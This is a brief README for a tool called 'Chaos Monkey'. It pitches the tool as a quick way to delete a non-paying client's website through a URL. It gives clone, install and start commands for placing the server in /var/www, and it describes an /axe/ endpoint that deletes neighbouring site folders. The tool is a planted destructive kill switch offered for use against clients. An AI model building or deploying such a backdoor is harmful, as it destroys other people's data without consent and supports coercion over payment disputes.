# Chaos Monkey

Have you ever wanted a quick want to delete your non-paying client’s website 
with a simple URL?

Use like:

    $ cd /var/www
    $ git clone {{thisRepo}}
    $ npm install
    $ node start server/www.js

Now you can get an endpoint:

    $ http://{{domain}}/axe/{{toBeDeleted}}

Such that any common folder at the same place as `chaos_monkey` will be 
deleted.
